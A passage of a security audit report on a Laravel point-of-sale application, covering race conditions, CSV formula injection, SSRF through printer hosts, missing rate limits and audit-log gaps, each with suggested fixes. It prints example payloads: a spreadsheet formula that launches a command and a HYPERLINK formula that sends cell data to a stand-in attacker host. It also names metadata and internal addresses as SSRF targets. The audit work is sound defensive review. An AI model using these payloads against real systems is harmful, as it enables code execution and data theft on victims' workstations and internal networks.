- **Per-customer promotion cap is not enforced under concurrency.** [RecordPromotionRedemptionsAction.php:39-46](app/Domain/Promotions/Actions/RecordPromotionRedemptionsAction.php#L39-L46) reads the per-customer cap with an unlocked `COUNT(*)` and there is no unique index on `(promotion_id, customer_id)`. The same customer checking out on two terminals can both count 0 and both redeem a `max_redemptions_per_customer = 1` promotion.
- **Over-receipt against a purchase order.** [ReceiveGoodsAction.php:128](app/Domain/Purchasing/Actions/ReceiveGoodsAction.php#L128) increments `quantity_received` atomically but never locks or re-checks the PO line, so two concurrent receipts can push `quantity_received` past `quantity_ordered`.
- **`enforceStock: false` disables the lock, not just the check.** [CompleteSaleAction.php:120-123](app/Domain/Sales/Actions/CompleteSaleAction.php#L120-L123) — the only production caller passes the default `true`, so this is latent, but any future caller passing `false` loses the row locks entirely rather than just the friendly error.

## Area 3 — verified clean

- **`InventoryService`** — the projection write is a single atomic `quantity = quantity + ?` with no read-modify-write, and `stock_levels` has `unique(['item_id','stock_location_id'])`, so its `firstOrCreate` cannot produce duplicates. `AdjustStockAction` is a thin wrapper over the same path.
- **`RecordCashMovementAction`** — lock-then-check-then-write against the same shift row `CloseShiftAction` locks, so a movement racing a close blocks and then correctly fails with `ShiftException::notOpen()` → 422. It is the only writer of `cash_movements`.
- **Shift double-close** — `CloseShiftAction` takes the lock *first*, inside the transaction, and re-checks `isOpen()` under it. A shift cannot be closed twice, and the counting, variance and status flip are all in the one transaction, so no partial close is observable.
- **`RefundSaleAction` and `VoidSaleAction`** — both lock the sale and its lines inside the transaction before reading `remainingReturnable()`/status. No double-refund, no double-void.
- **`RecordGiftcardRedemptionAction`** — locks on a uniquely-indexed column, with the balance read and debited under that lock inside the sale transaction.
- **`assertSerialsAvailable`** — the serial row is locked before its status is read, and `serial_numbers.serial` is unique.
- **The dinner-table create branch** of `CreateOrResumeCartAction` correctly locks the table, then checks, then writes.
- **Promotion redemption counters** use atomic `increment()` on rows already locked earlier in the same transaction.
- **Document numbering is gap-free as designed** — `next()` always runs inside the caller's transaction as a savepoint, so a rollback rewinds `next_value` with it and the number is reused rather than skipped. The increment itself is correctly locked; the problems are the lock *duration* and *ordering* (3-H3).

---

# Area 5 — Injection and input handling

## Confirmed

### 5-H1 · HIGH · CSV formula injection in all ten report exporters

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [ItemReportExportController.php:29-37](app/Http/Controllers/Reports/ItemReportExportController.php#L29-L37) and nine siblings in [app/Http/Controllers/Reports/](app/Http/Controllers/Reports/) |

**What's wrong.** Every report exporter writes database text straight into a CSV cell with no
formula-neutralising prefix:

```php
// ItemReportExportController.php:29-37
fputcsv($handle, [
    $row->sku,
    $row->item_name,
    $row->category_name,
    …
], escape: '');
```

The same shape appears in `InventoryReportExportController` (item name, SKU, location name),
`CustomerReportExportController` (`customer_name`), `SupplierReportExportController` (`company_name`),
`CategoryReportExportController`, `SalesReportExportController`, `ReceivingReportExportController`,
`CommissionReportExportController`, `PaymentReportExportController`, `ShiftReportExportController` and
`TaxReportExportController`. Grepping `app/Http/Controllers/Reports/` and `app/Support/` for any
`escapeFormula`/`sanitizeCell`/`str_starts_with` helper returns **nothing** — no escaping exists.

Note the `escape: ''` argument is *correct* (it disables PHP's non-RFC backslash escaping) and is
unrelated to this class of bug — it is not a formula guard.

**Why it matters.** A user with `items.create` — or anyone who can create a customer, which is a far
lower bar — names a record:

```
=cmd|'/c calc.exe'!A1
```

or the quieter exfiltration variant `=HYPERLINK("http://attacker/?d="&A1,"Click")`. The item name
validation ([Import.php:96](app/Livewire/Catalog/Items/Import.php#L96)
`'name' => ['required','string','max:255']`) permits any characters. Path:
`Item.name` → `ItemReportQuery::forExport()` → `ItemReportExportController.php:31` →
`items-report.csv` → **a manager opens it in Excel and the command executes on their workstation**.
This is a stored payload that escapes the web app entirely and lands on a finance or ops machine,
which is typically better-privileged than the POS.

**Suggested fix.** Add one shared helper that prefixes any cell whose first character is `=`, `+`,
`-`, `@`, tab or CR with a single quote (or wraps it in `="…"`), and route all ten exporters through
it. A single `Str`-based function plus one call per `fputcsv` argument list closes the whole class.

---

### 5-M1 · MEDIUM · Unvalidated printer host enables outbound SSRF and internal port scanning

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [Terminals/Form.php:63](app/Livewire/Sales/Terminals/Form.php#L63), [PrintConnectorFactory.php:41-47](app/Domain/Sales/Support/PrintConnectorFactory.php#L41-L47) |

**What's wrong.** The printer target is validated only as a bounded string —

```php
'receipt_printer' => ['nullable', 'string', 'max:64', Rule::requiredIf($this->printer_connector !== '')],
```

— with no IP or hostname format rule, and it flows directly into a raw socket:

```php
// PrintConnectorFactory.php:41-47
private function networkConnector(string $target): NetworkPrintConnector
{
    [$ip, $port] = str_contains($target, ':')
        ? explode(':', $target, 2)
        : [$target, '9100'];

    return new NetworkPrintConnector($ip, (int) $port, 5);
}
```

Identical code in [KitchenPrinterConnectorFactory.php:41-47](app/Domain/Inventory/Support/KitchenPrinterConnectorFactory.php#L41-L47)
and [LabelPrinterConnectorFactory.php:41-47](app/Domain/Inventory/Support/LabelPrinterConnectorFactory.php#L41-L47),
fed by the stock-location form.

**Why it matters.** An operator with terminal-admin rights sets connector `network` and
`receipt_printer` to `169.254.169.254:80` (cloud instance metadata), `127.0.0.1:6379` (Redis), or
`10.0.0.5:22`. Printing a receipt then opens a socket **from the application server** to that
host:port and writes attacker-influenced ESC/POS bytes — which include the free-text `receipt_footer`
setting and item names. The connect-versus-timeout distinction is surfaced back to the user through
`PrintingException::connectionFailed($e->getMessage())`, giving a working internal port scanner.

**Mitigating:** this requires `Gate::authorize('update', $terminal)`, so it is a privileged-user →
internal-network pivot rather than anonymous SSRF. That bounds the severity but does not remove it —
it is exactly the primitive an attacker wants after compromising a manager account.

**Suggested fix.** Validate the target with an IP/hostname rule and reject loopback, link-local
(`169.254.0.0/16`), and metadata addresses; constrain the port to a printer range (9100–9109) unless
explicitly overridden.

---

### 5-L1 · LOW · Every domain model is `$guarded = ['id']` — latent, with no exploitable write path found

| Field | Content |
|---|---|
| **Severity** | Low (latent) |
| **Location** | e.g. [User.php:28](app/Domain/Identity/Models/User.php#L28), [Giftcard.php:18](app/Domain/Giftcards/Models/Giftcard.php#L18), [Sale.php:42](app/Domain/Sales/Models/Sale.php#L42), [Item.php:29](app/Domain/Catalog/Models/Item.php#L29) |

**What's wrong.** All 52 models under `app/Domain/**/Models/` declare `protected $guarded = ['id'];`,
making `balance`, `is_active`, `commission_rate`, `paid_total`, `price_overridden` and
`stock_location_id` mass-assignable at the model layer.

**Why it matters — and why this is Low.** Every write path was traced and **none passes an unfiltered
request array**: `grep -rn "request()->all()\|\$request->all()\|->fill(\|::create(\$request\|->update(\$request"`
over `app/Http/` and `app/Livewire/` returns **zero** hits. Sensitive writers build explicit arrays
(`Identity/Users/Form.php:99-104` constructs a 4-key literal; `role` goes through `syncRoles()`, not a
column), and `UpdateCartLineAction` applies a hard allow-list *inside the action* so `CartLine`'s
`$guarded` cannot be leveraged — `price_overridden` is accepted by the FormRequest and then
**discarded** by that `array_intersect_key`, with the audit flag set server-side from `$user->id`.
This is a latent hazard, not a live vulnerability: one future `->update($request->all())` turns it
into privilege escalation.

**Suggested fix.** Replace `$guarded = ['id']` with explicit `$fillable` on the models that carry
security- or money-sensitive columns (`User`, `Giftcard`, `Sale`, `Payment`, `SupplierInvoice`,
`Item`), so the safety does not depend on every future caller remembering to filter.

## Suspected

### 5-S1 · `logo_path` reaches a raw filesystem path in a PDF `<img src>`

[receipt.blade.php:28](resources/views/pdf/sales/receipt.blade.php#L28) renders
`Storage::disk('public')->path($business->logo_path)` directly into an `<img src>` (same at
[supplier-invoice.blade.php:12](resources/views/pdf/purchasing/supplier-invoice.blade.php#L12)).
**Not currently exploitable:** `logo_path` is not attacker-settable —
[BusinessProfile.php:99](app/Livewire/Settings/BusinessProfile.php#L99) assigns
`$this->logo->store('branding', 'public')`, so Laravel generates the filename and the original never
reaches the path; the upload is constrained to a PNG image with dimension and size limits; and Dompdf
runs with `enable_remote => false` and `chroot => base_path()`. Flagged only because the sink is a raw
filesystem path in an `<img src>`, which would become a local-file-read the moment `logo_path` gained
a text-input write path.

## Area 5 — verified clean

- **All 17 raw-SQL sites are safe.** Every `selectRaw` in `app/Domain/Reporting/Queries/**` is a 100% static string literal with no PHP interpolation, as are `ReorderSuggestionsQuery` and `StockLot`'s `orderByRaw('expires_on IS NULL, expires_on ASC')`.
- **The `orderByRaw` sort-injection the brief predicted does not exist.** There is **no** `$sortField`, `$sortBy` or `$sortDirection` property anywhere in `app/` — zero Livewire sort properties. The only `sortBy` hit is an in-memory Collection method with a hard-coded key. All 78 `orderBy()` call sites use string literals. Report filters (`$reason`, `$type`, `$business_type`, `$supplier_id`) all land in parameterised `->where()` bindings, and integer filters go through `$request->integer(...)`.
- **`InventoryService::assertNumeric` is airtight.** The `^-?\d+(\.\d+)?$` guard is applied with `trim()` *inside* the `preg_match()` call, so the classic PCRE trailing-newline bypass (`"1\n; DROP TABLE"`) cannot survive; the same normalised string that was validated is the one returned, so there is no TOCTOU gap. The guard is applied redundantly at both `record()` and `applyToProjection()`.
- **`WindowsPrinterDiscovery` shell execution is clean** ([WindowsPrinterDiscovery.php:20-26](app/Support/Printing/WindowsPrinterDiscovery.php#L20-L26)). The `Process` argument array is **entirely constant** — no parameter, property or config value reaches it — and Symfony's array form bypasses the shell. The whole-repo sweep for `new Process|Process::|proc_open|shell_exec|exec(|passthru|system(` returns this **single hit**.
- **ESC/POS connector path traversal and command injection are blocked upstream.** `WindowsPrintConnector` enforces strict constructor regexes (`REGEX_PRINTERNAME`, `REGEX_SMB`) before any value reaches `proc_open`, rejecting anything containing `/`, `\`, `..`, `;`, `|` or `&`; both it and `CupsPrintConnector` additionally `escapeshellarg()` every interpolated value. The `printer_connector` discriminator is allow-listed with `Rule::in`. Only the *network* branch is unconstrained (5-M1).
- **CSV import validation and storage are sound.** [Import.php:42](app/Livewire/Catalog/Items/Import.php#L42) enforces both server-side MIME (`mimes:csv,txt`) and size (`max:2048`); authorization is checked in `mount()` **and again inside `import()`**, which is the correct Livewire pattern. Livewire's temp upload dir defaults to `storage/app/livewire-tmp`, outside the webroot, and `public/` has no `storage` symlink. Rows are **not** blind mass-assigned: `processRow()` validates per column and hand-builds an explicit attribute array, resolving category/supplier/tax-category by name lookup so no raw FK from the CSV can reach a record.
- **Dompdf is safely configured.** No `config/dompdf.php` exists, so the package defaults apply: `enable_php => false`, `enable_remote => false`, `chroot => realpath(base_path())`. There are no inline `setOption()` overrides at any of the three `Pdf::loadView` call sites. SSRF via `<img src>`/`@import` is structurally impossible.
- **No XSS sinks.** `grep -rn "{!!" resources/views/` returns **0 results** across the entire view tree, and `v-html|@js(|innerHTML|eval(|document.write|insertAdjacentHTML` over `resources/` returns **0 results**. User-settable values in the receipt template (`receipt_footer`, `store_name`, `item_name`, customer company name) all use escaped `{{ }}`.

---

# Area 6 — Recent feature work

Findings that belong to another area are cross-referenced rather than repeated: the **commission
basis defect** shipped in `0e31f2e` is [1-H2](#1-h2--high--subtotal-is-stored-net-of-discount-then-four-consumers-subtract-the-discount-again),
which also covers the tip pad it was copied into.

## Confirmed

### 6-M1 · MEDIUM · Business-type filtering is missing from the item-kit endpoint and the cart-add path

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [ItemKitController.php:16-30](app/Http/Controllers/Api/V1/ItemKitController.php#L16-L30), [AddCartLineAction.php:16](app/Domain/Sales/Actions/AddCartLineAction.php#L16) |

**What's wrong.** The business-type filter is applied in exactly three places —
`ItemController::index`, `ItemController::showByBarcode` and `Livewire\Catalog\Items\Index` (plus
`ItemReportQuery`, which implements its own equivalent predicate). The kit endpoint has none:

```php
// ItemKitController.php:18-27
$kits = ItemKit::query()
    ->with('items')
    ->when($request->filled('q'), function (Builder $query) use ($request) { … })
    ->orderBy('name')
    ->paginate(max(1, min($request->integer('per_page', 25), 100)));
```

and neither does the cart-add path — `AddCartLineAction::execute(Cart $cart, Item $item, …)` performs
no business-type check anywhere in its body, while `CartLineController.php:26` resolves the item with
a bare `Item::findOrFail($validated['item_id'])`.

**Why it matters — with the severity qualifier the brief asked for.** `business_type` is a **single
global setting**, not a per-tenant discriminator: `BusinessProfileSettings` holds one row per install,
and `grep -rn business_type database/migrations/` returns only a `business_types` JSON column on
`items`. It is even published to API clients by `ConfigController`. **So these are merchandising and
pricing bugs, not a data-isolation breach** — nobody crosses a tenant line.

Within that scope the impact is real. The register searches both endpoints in parallel
([Register.vue:346-352](resources/js/pos/views/Register.vue#L346-L352)), so a retail store searching
"combo" gets no restaurant items from `/items` but **does** get the restaurant-only "Lunch Combo" kit
from `/item-kits`. That kit is then priced against the *filtered* offline catalog
([Register.vue:376](resources/js/pos/views/Register.vue#L376)): every filtered-out component is
silently skipped, so a 3-component kit whose 2 restaurant-only components are missing **quotes at
roughly one third of its price**. Separately,
`POST /api/v1/carts/{cart}/lines {"item_id": <restaurant-only item>, "quantity": 1}` sells a
filtered-out item directly, since `EnsureBusinessType` gates route groups, not item identity.

Also unfiltered, though lower impact: `CategoryReportQuery` and `SalesReportQuery` join `items` with
no business-type parameter, and the eight item-picker screens across Inventory, Purchasing and
Promotions all use a bare `Item::active()->orderBy('name')->get()`.

**Suggested fix.** Give `ItemKit` the same `forBusinessType` scope (filtering on its components) and
apply it in `ItemKitController::index`; assert the item is sold by the current business type inside
`AddCartLineAction` so every caller inherits the check. Then decide deliberately whether the eight
back-office pickers should filter, and make that consistent.

---

### 6-M2 · MEDIUM · Client and server disagree on change due, and a second overpayment is silently swallowed

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [CompleteSaleAction.php:111-115](app/Domain/Sales/Actions/CompleteSaleAction.php#L111-L115), [cart.js:56-60](resources/js/pos/stores/cart.js#L56-L60) |

**What's wrong.** The server takes the **max** of two independent views of overpayment:

```php
$overpaid = $paid->isGreaterThan($dueTotal) ? $paid->minus($dueTotal) : MoneySupport::zero();
$change = $tenderedChange->isGreaterThan($overpaid) ? $tenderedChange : $overpaid;
```

while the client only ever sees the `tendered − amount` gap:

```js
const tendered = Number(payment.tendered || 0);
const amount = Number(payment.amount || 0);
return sum + Math.max(0, tendered - amount);
```

**Why it matters.** Two divergences.

*API path.* Cart due 100.00. `POST /carts/{cart}/payments` with `{amount: 150.00, tendered: 150.00}`
is a legal request — [AddCartPaymentRequest.php:24](app/Http/Requests/Api/V1/AddCartPaymentRequest.php#L24)
is only `['required','numeric','gt:0']`, with **no `lte` against the cart total**. The client computes
`max(0, 150 − 150) = 0.00` and shows nothing owed; the server computes `overpaid = 50` and prints
`CHANGE DUE 50.00` on the receipt. A 50.00 till discrepancy against the printed receipt. `Payment.vue`'s
own clamp keeps this off the register, but any other API consumer (a waiter app, a kiosk, an offline
replay built before the clamp) hits it.

*Register path.* Due 100, cash tendered 150 → booked `amount=100, tendered=150`, due now 0. The
cashier mis-taps card for 20; `Payment.vue:156` computes `Math.min(20, due.value || 20)` and, since
`due.value` is `0` (falsy), the `||` fallback makes `amount = 20` — so a payment is accepted against a
zero-due cart. The customer handed over 170 for a 100 bill and is owed 70, but both sides compute
50.00: the deliberate non-summing `max()` **silently swallows the second overpayment** and the
customer is under-refunded by 20.00.

**Suggested fix.** Validate payment `amount` against the outstanding balance server-side, fix the
`due.value || 20` falsy-fallback, and make the client mirror the server's `max(tenderedChange,
overpaid)` formula so the drawer prompt and the receipt cannot disagree.

---

### 6-L1 · LOW · Windows printer discovery re-shells `powershell.exe` on every Livewire round-trip

| Field | Content |
|---|---|
| **Severity** | Low |
| **Location** | [Terminals/Form.php:93](app/Livewire/Sales/Terminals/Form.php#L93), [StockLocations/Form.php:107](app/Livewire/Inventory/StockLocations/Form.php#L107) |

**What's wrong.** The discovery call sits inside `render()`:

```php
public function render()
{
    return view('livewire.sales.terminals.form', [
        'stockLocations' => StockLocation::orderBy('name')->get(),
        'windowsPrinters' => app(WindowsPrinterDiscovery::class)->sharedQueues(),
    ]);
}
```

Livewire calls `render()` on **every** component round-trip, and the form has live-bound fields
throughout. There is no `Cache::remember`, no memoised property, and no `#[Computed(persist: true)]`.

**Why it matters.** On a Windows host, every keystroke-debounce on the terminal settings page spawns a
fresh `powershell.exe -Command 'Get-Printer | …'`. `Get-Printer` on a machine with mapped network
queues routinely takes 1–3s against a 5s timeout ceiling, so the settings page stalls for seconds per
interaction. No effect on checkout.

**Suggested fix.** Wrap the call in `Cache::remember(..., now()->addMinutes(5), …)` or hoist it into
`mount()`.

## Suspected

- **Refunds are date-shifted out of the commission period they belong to.** [CommissionReportQuery.php:49-51](app/Domain/Reporting/Queries/CommissionReportQuery.php#L49-L51) scopes on `sold_at`, and the return sale carries the *refund* date. A January sale earning +10.00, refunded 3 February, shows +10.00 in January (already paid out) and −10.00 in February. It reconciles all-time but not per payroll period, and the UI copy promises "A refund reverses commission automatically" without the caveat.
- **A fully-refunded sale keeps its tip credit.** `RefundSaleAction` never writes `tip_amount`, so the return row defaults to 0 while `CommissionReportQuery` sums tips across the range. This is documented as intentional in the migration and disclosed in the UI, so it is policy — but a full refund of a 100.00 tipped bill leaves the waiter credited a tip on money the store gave back.
- **`ItemReportQuery` drops partially-refunded sales entirely.** [ItemReportQuery.php:41](app/Domain/Reporting/Queries/ItemReportQuery.php#L41) filters `sales.status = STATUS_COMPLETED`, but `RefundSaleAction` flips the original to `REFUNDED`/`PARTIALLY_REFUNDED`. The original's positive lines vanish while the return sale (status `completed`, type `return`) remains, so an item with one 100.00 sale and one 20.00 partial refund reports **−20.00 revenue** instead of 80.00. Pre-existing rather than introduced by `9e6d4d9`, but that commit edited this exact query without fixing it — and `CommissionReportQuery` uses the correct `status != voided` form, so the two reports now disagree by construction.

## Area 6 — verified clean

- **Card payments requiring a terminal reference for manual methods (`ad56dbd`) — genuinely server-side and not bypassable.** [AddCartPaymentAction.php:33-37](app/Domain/Sales/Actions/AddCartPaymentAction.php#L33-L37) derives "manual method" from **DB columns on the `payment_methods` row** (`kind === 'card' && provider === 'manual'`), and that row is loaded server-side from the id the client supplies — so there is no `required_if` on client-chosen data to game. The FormRequest is deliberately permissive with enforcement in the action, and `AddCartPaymentAction::execute` is the **only** `CartPayment::create` in the codebase. Calling the API directly with `reference` of `null`, `""` or `"   "` all throw, since `blank()` trims.
- **Windows printer discovery degrades correctly off Windows (`5540cc0`).** All three container-safety concerns are handled: an OS guard returns `[]` before any process is constructed ([:15-17](app/Support/Printing/WindowsPrinterDiscovery.php#L15-L17)), a 5s timeout is set, and `mustRun()`'s `ProcessFailedException`, a missing-executable error and the `JSON_THROW_ON_ERROR` decode are all swallowed by `catch (Throwable) { return []; }`. Nothing propagates into a request, and the Blade degrades to a free-text input. **Checkout is structurally unaffected** — the only two callers are the Terminals and StockLocations *settings forms*, never `PrintReceiptAction` or any sales path. The sole defect is the missing cache (6-L1).
- **Change calculation is otherwise correct (`0f88c9e`)** — rounding is half-up on a non-negative quantity on both sides with no drift; the negative-change guard is present on both (`Math.max(0, …)` / `isGreaterThan(…) ? … : zero()`); change is computed **post-tip** on both sides and they agree; and **the stale-change scenario does not occur** — `Payment.vue`'s `changeDue` is a Vue `computed` over `tendered`, so typing 50 then correcting to 30 re-renders immediately.
- **Commission report scoping and authorization (`0e31f2e`)** — correctly excludes quotes and work orders via `->revenue()` and voids via `status != STATUS_VOIDED`; `sale_count` correctly excludes return rows. Totals reconcile with what was stored at sale time, summing the frozen `commission_amount` column with no re-derivation from the waiter's current rate, and `commission_rate_applied` is frozen on both the sale and the reversal. Both the view and the export are gated by `permission:reports.employees`, with a defence-in-depth `Gate::authorize` in the component, and the seeded `Waiter` role does **not** hold that permission — so no waiter can reach the report at all, let alone another waiter's row. (The export controller relies on route middleware alone, with no in-body gate — correct today, fragile if the route is re-registered.)
- **The offline catalog sync inherits the business-type filter** correctly, since it reads `ItemController::index`.

---

# Area 7 — Incomplete work

**This area is remarkably clean, and two of the brief's predicted findings do not exist.** Both
deserve to be stated plainly, because a "no findings" result here is itself the useful answer.

**Correction to an early figure in this audit.** A first-pass grep suggested ~71 debug statements in
`app/`, `routes/` and `resources/`. That count was wrong — the pattern `dd(` matches `->add(` and
`bcadd(`, and `ray(` matches `array(`, `is_array(` and `toArray(`. A precise sweep:

```
grep -rnE "(^|[^a-zA-Z0-9_>$-])(dd|dump|var_dump|print_r)\s*\(|console\.(log|debug)\s*\(" app/ routes/ resources/
```

returns **zero results**. The only console output anywhere in the PWA is two
`console.warn("Audio playback blocked", e)` calls in
[audio.js:34](resources/js/pos/lib/audio.js#L34) and [:57](resources/js/pos/lib/audio.js#L57),
which print no token, cart or PII. There are also **no** `TODO`, `FIXME`, `@todo` or `HACK` markers
anywhere in `app/`, `routes/` or `resources/`.

## Area 7 — verified clean

- **Zero `wire:click` orphans — the brief's predicted guaranteed-500 does not exist.** Every one of the 71 components declares an explicit view name in `render()`, giving a 1:1 mapping to the 71 Blade files (including non-obvious ones such as `Inventory/StockLocations/StockLevels.php:35` → `livewire.inventory.stock-locations.stock-levels`). Cross-checking every `wire:click|submit|change|keydown*|keyup*|blur|input|init|poll*`, `x-on:*`, `@click` and `$wire.method()` handler against the resolved component's public methods — after stripping the Livewire built-ins (`$refresh`, `$set`, `$toggle`, `$dispatch`, `$parent`, `$commit`, `$js`, uploads) — yields **0 missing and 0 non-public** across a distinct handler set of 47 names. Spot-verified by hand against 8 components (`Audit/Index::toggle`, `Reporting/Commissions::toggle`, `Sales/Shift/Manage::{open,close,recordCashMovement}`, `Inventory/StockCounts/Form`'s seven handlers, `Purchasing/ReorderSuggestions/Index::createPurchaseOrder`) to confirm the sweep was not silently under-matching. The 24 expressions that looked non-callable are all `wire:confirm="…"` prose.
- **Every route resolves to a real controller method.** Each `[X::class, 'method']` and invokable `X::class` in `routes/{api,web,backoffice}.php` was resolved through its file's `use` aliases and checked for a matching `public function` / `__invoke`: **0 missing methods, 0 missing classes.**
- **No dead actions.** All 46 classes under `app/Domain/**/Actions/` have at least one non-test, non-self reference in `app/`, `routes/`, `resources/`, `database/`, `config/` or `bootstrap/`. Zero uncalled, zero called only from tests.
- **Every one of the 13 domains under `app/Domain/` has a corresponding `tests/Feature/` directory.** No domain is untested.

## Suspected

### 7-S1 · Taxation is the thinnest money-path coverage in the codebase

`app/Domain/Taxation/` holds 8 source files including `TaxEngine`, which performs the
inclusive/exclusive divisor arithmetic (`bcadd('100', $rate, 6)`). Its entire dedicated coverage is
`tests/Unit/Taxation/TaxEngineTest.php` with **8 test methods**; the 17 tests in
`tests/Feature/Taxation/TaxCategoriesTest.php` are back-office CRUD for the category screen, not
engine math. Given that [1-C1](#1-c1--critical--tax-inclusive-pricing-is-read-from-two-divergent-sources)
— a critical double-charge — lives exactly in the seam between `TaxEngine` and `CartPricer` and was
not caught by any test, this is the coverage gap most worth closing first.

**Giftcards** (3 actions + 2 models, 12 lifecycle tests) is the second thinnest for a bearer
instrument, and is where [1-H3](#1-h3--high--refunds-and-voids-never-reverse-gift-card-balances-loyalty-points-or-promotion-counters)'s
missing refund reversal sits untested. **Documents** has the lowest ratio (5 files, 1 test file) but
the lowest risk, being rendering only. Sales, Inventory and Purchasing are proportionately covered.

---

# Area 8 — Hardening

## Confirmed

### 8-H1 · HIGH · No API rate limiter exists — every API route except login is unthrottled

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [bootstrap/app.php:27-33](bootstrap/app.php#L27-L33), [routes/api.php:63](routes/api.php#L63) |

**What's wrong.** The middleware block registers three aliases and nothing else:

```php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->alias([
        'permission' => PermissionMiddleware::class,
        'role' => RoleMiddleware::class,
        'business.type' => EnsureBusinessType::class,
    ]);
})
```

There is no `->throttleApi()` call, and `grep -rn "RateLimiter" app/ config/ bootstrap/ routes/`
returns only the `login` limiter. In Laravel 13 the `api` middleware group is assembled
conditionally — the `throttle:` entry is included **only if** `throttleApi()` was called, which it
never is. The `api` group therefore reduces to `[SubstituteBindings]`.

**Why it matters.** A single stolen, shared or borrowed cashier token can enumerate at unlimited
rate. The sharpest case is the gift-card balance oracle:

```php
// routes/api.php:63
Route::get('giftcards/{number}', [GiftcardController::class, 'showByNumber'])->name('giftcards.show');
```

Gift cards are bearer instruments and this endpoint answers "is this number valid, and what is on
it" — with no throttle, card-number entropy is the *only* defence, and an attacker can grind it at
full speed. `GET items/barcode/{barcode}` ([routes/api.php:38](routes/api.php#L38)) and
`GET customers` ([:58](routes/api.php#L58)) are similarly open for catalog and customer-PII
enumeration, and every cart/payment/complete write is unthrottled too. On the web side,
`routes/backoffice.php` has no `throttle:` anywhere either; it is all behind `auth` plus `permission:`,
but the 23 report-export endpoints are unthrottled expensive queries — a DoS-by-refresh vector for
any authenticated user.

**Suggested fix.** Add `->throttleApi()` (or a named limiter) in `bootstrap/app.php`, and give the
gift-card lookup a tighter per-user limit of its own.

**Login is correctly throttled — clean.** Both surfaces are covered:
[FortifyServiceProvider.php:49-53](app/Providers/FortifyServiceProvider.php#L49-L53) registers a
5/minute limiter keyed on username+IP (wired via `config/fortify.php:118`), and
[routes/api.php:28-30](routes/api.php#L28-L30) applies `throttle:6,1` to the API login. Password
reset is not a gap because the feature is deliberately disabled — `config/fortify.php:174-177`
enables only `updateProfileInformation` and `updatePasswords`, so no reset routes exist.

---

### 8-H2 · HIGH · The activity log misses six of the nine events an auditor needs

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [Sale.php:63-70](app/Domain/Sales/Models/Sale.php#L63-L70), [OpenCashDrawerAction.php:15-23](app/Domain/Sales/Actions/OpenCashDrawerAction.php#L15-L23), [Identity/Users/Form.php:112](app/Livewire/Identity/Users/Form.php#L112) |

**What's wrong.** The instrumentation is exhaustively small: **exactly two models** use `LogsActivity`
(`Sale` and `SupplierInvoice`) and **exactly three** `activity()` call sites exist
(`LogShiftOpened`, `LogShiftClosed`, `LogLowStockOnSaleCompleted`). Everything else that an auditor
would look for is a non-model action, or a write on a model with no logging trait.

| Auditor event | Logged? | Evidence |
|---|---|---|
| Sale **void** | **Yes** | `Sale::getActivitylogOptions()` logs `status`, `voided_by_user_id`, `void_reason`; `VoidSaleAction` updates the Sale in place so the trait fires |
| **Refund** | **Yes** | Same options log `returns_sale_id` + `status` |
| Shift open / close **with variance** | **Yes** — the best-instrumented event | [LogShiftClosed.php:15-25](app/Listeners/LogShiftClosed.php#L15-L25) records `expected_cash`, `counted_cash`, `cash_variance` in the log properties |
| **Cash drawer open** | **No** | [OpenCashDrawerAction.php:15-23](app/Domain/Sales/Actions/OpenCashDrawerAction.php#L15-L23) is `$printer->pulse();` in a try/finally — no model write, no `activity()`. A cashier can pop the till unlimited times and leave **no record whatsoever** |
| **Price override** | **No** | Authorized at [CartLineController.php:48](app/Http/Controllers/Api/V1/CartLineController.php#L48) but never logged — see 8-M1 |
| **Stock adjustment** | **No** | `AdjustStockAction` writes only a `StockMovement`, which has no `LogsActivity`. Attribution survives in `stock_movements.user_id` and a note is mandatory, but it never reaches `activity_log` or the `/audit` screen |
| **Role / permission change** | **No** | [User.php:21-26](app/Domain/Identity/Models/User.php#L21-L26) uses `HasApiTokens, HasFactory, HasRoles, Notifiable, SoftDeletes` — **no `LogsActivity`** — and `syncRoles()` writes a pivot on unmodified Spatie models. **Privilege escalation is invisible in the audit trail** |
| **User deactivation** | **No** | `is_active` is written through `$this->user->update($userFields)` on that same unlogged model |
| **Settings change** | **No** | spatie/laravel-settings persists to its own table with no model events; changing the receipt header, tax defaults or document numbering leaves no trace |

**Why it matters.** The `/audit` screen reads straight from `Activity::query()` with no `log_name`
filter ([Audit/Index.php:112-117](app/Livewire/Audit/Index.php#L112-L117)), so it shows the union of
the above — which means role grants, user deactivations, drawer opens, stock adjustments and settings
edits **simply never appear**. An auditor investigating till shrinkage cannot distinguish "the drawer
was never opened out-of-sale" from "we do not record that", and an investigator looking at a
privilege-escalation incident has no trail at all. Given [3-C1](#3-c1--critical--a-stock-count-applies-a-stale-snapshot-as-a-delta)
can silently corrupt stock and [1-H4](#1-h4--high--shift-expected-cash-ignores-change_given-and-excludes-refunds)
manufactures false shortages, the absence of a drawer-open and stock-adjustment trail is what makes
those findings hard to investigate after the fact.

**Suggested fix.** Add `LogsActivity` to `User` (logging `is_active` and role changes via an explicit
`activity()` call in the role-sync path), and add explicit `activity()` calls to
`OpenCashDrawerAction`, `AdjustStockAction`, the price-override path, and each settings component's
save.

---

### 8-M1 · MEDIUM · Price-override attribution is dropped at checkout, contradicting the model's stated contract

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [create_sales_tables.php:90](database/migrations/2026_01_01_000900_create_sales_tables.php#L90), [CompleteSaleAction.php:202](app/Domain/Sales/Actions/CompleteSaleAction.php#L202) |

**What's wrong.** The override *is* attributed on the cart — `cart_lines` carries both
`price_overridden` and `price_overridden_by_user_id`
([create_cart_tables.php:62-63](database/migrations/2026_01_01_000800_create_cart_tables.php#L62-L63)),
set server-side from `$user->id` in `UpdateCartLineAction`. But `sale_lines` has **only the boolean**
(`grep -n price_overridden database/migrations/*.php` confirms the user-id column exists on
`cart_lines` only), and the completion copies only the boolean:

```php
// CompleteSaleAction.php:202
'price_overridden' => $cartLine->price_overridden,
```

**Why it matters.** On the permanent sale record an auditor can see **that** a price was overridden
but not **by whom** — while [Sale.php:63](app/Domain/Sales/Models/Sale.php#L63)'s own docblock states
"Voids, refunds and price overrides must be attributable." For price overrides that contract is not
met. Severity is Medium rather than High only because carts are not deleted or pruned
(`CompleteSaleAction` sets `STATUS_COMPLETED` and `Cart` is not `Prunable`), so the user id is
technically recoverable by joining back to `cart_lines` — but no report, screen or log entry surfaces
